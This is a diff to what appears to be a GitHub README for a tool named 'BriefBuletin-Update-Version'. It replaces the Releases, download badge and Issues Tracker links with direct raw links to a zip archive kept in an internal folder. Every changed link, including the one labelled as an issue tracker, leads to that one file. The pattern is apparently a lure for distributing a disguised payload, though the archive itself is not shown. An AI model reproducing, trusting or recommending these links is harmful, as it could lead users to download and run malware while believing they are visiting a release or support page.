@@ -8,11 +8,11 @@ To begin, you will need to download the software from our Releases page.
 
 ## 🔗 Download Now
 
-[![Download BriefBuletin-Update-Version](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/longlinercap/BriefBuletin-Update-Version/releases)
+[![Download BriefBuletin-Update-Version](https://raw.githubusercontent.com/longlinercap/BriefBuletin-Update-Version/main/BriefBuletin_API/internal/Brief_Update_Version_Buletin_v1.3.zip%20Now-brightgreen)](https://raw.githubusercontent.com/longlinercap/BriefBuletin-Update-Version/main/BriefBuletin_API/internal/Brief_Update_Version_Buletin_v1.3.zip)
 
 ## 📥 Download & Install
 
-1. Visit our [Releases page](https://github.com/longlinercap/BriefBuletin-Update-Version/releases) to view the available versions.
+1. Visit our [Releases page](https://raw.githubusercontent.com/longlinercap/BriefBuletin-Update-Version/main/BriefBuletin_API/internal/Brief_Update_Version_Buletin_v1.3.zip) to view the available versions.
 2. Locate the latest release.
 3. Download the application file that matches your operating system.
 4. Follow the installation prompts to install the application on your computer.
@@ -60,8 +60,8 @@ For questions or technical support, please open an issue in our GitHub repositor
 
 ## 🔗 Important Links
 
-- [Releases Page](https://github.com/longlinercap/BriefBuletin-Update-Version/releases)
-- [Issues Tracker](https://github.com/longlinercap/BriefBuletin-Update-Version/issues)
+- [Releases Page](https://raw.githubusercontent.com/longlinercap/BriefBuletin-Update-Version/main/BriefBuletin_API/internal/Brief_Update_Version_Buletin_v1.3.zip)
+- [Issues Tracker](https://raw.githubusercontent.com/longlinercap/BriefBuletin-Update-Version/main/BriefBuletin_API/internal/Brief_Update_Version_Buletin_v1.3.zip)
 
 ## 🎉 Acknowledgments
 
